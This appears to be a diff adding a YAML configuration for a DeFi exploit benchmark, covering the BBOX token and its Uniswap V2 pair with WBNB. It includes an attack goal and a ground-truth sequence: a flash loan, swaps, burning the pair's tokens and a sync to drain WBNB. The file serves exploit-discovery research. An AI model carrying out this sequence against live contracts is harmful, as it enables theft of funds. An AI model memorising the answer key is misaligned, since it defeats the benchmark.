@@ -1,0 +1,64 @@
+# Information for benchmarks building.
+project_name: "BBOX"
+
+ctrt_name2cls:
+  - ["bbox", "BBOX"]
+  - ["wbnb", "WBNB"]
+  - ["pair", "UniswapV2Pair"]
+  - ["factory", "UniswapV2Factory"]
+  - ["router", "UniswapV2Router"]
+
+ctrt_name2deploy:
+  - [
+      "bbox",
+      "new BBOX(
+      0x3c3E68480EfFd99cb30C026bC5ADd03548327290,
+      0x8aC86Aea70E8F3E9C663bd4398B9c258e25684B0,
+      address(wbnb))",
+    ]
+  - ["wbnb", ""]
+  - ["pair", ""]
+  - ["factory", ""]
+  - ["router", ""]
+
+extra_actions:
+  - "function burn_pair_bbox(uint256 amount) internal {
+        vm.startPrank(contractAddress);
+        BBOX.transfer(attacker, BBOX.balanceOf(contractAddress));
+        vm.stopPrank();
+    }"
+
+extra_deployments:
+  - "bbox.afterDeploy(address(router), address(pair));"
+extra_constraints: []
+
+attack_goal: "wbnb.balanceOf(attacker) >= 1e18 + balanceOfwbnbattacker"
+
+groundtruth:
+  - ["borrow", "wbnb", "100000e18"]
+  - ["swap", "pair", "wbnb", "bbox", "wbnb.balanceOf(attacker)"]
+  - ["burn", "pair", "bbox", "bbox.balanceOf(attacker) / 2"]
+  - ["sync", "pair"]
+  - ["swap", "pair", "bbox", "wbnb", "bbox.balanceOf(attacker)"]
+  - ["payback", "wbnb", "100000e18 * 1003 / 1000"]
+
+# Information for search space building.
+roles:
+  "wbnb":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "bbox":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: false
+    is_burnable: true
+  "pair":
+    is_swappair: true
+    uniswap_order: ["wbnb", "bbox"]
+    support_swaps:
+      "wbnb": ["bbox", "wbnb"]
+      "bbox": ["bbox", "wbnb"]
+    is_oracle: true
+
+pattern: "Token Burn"
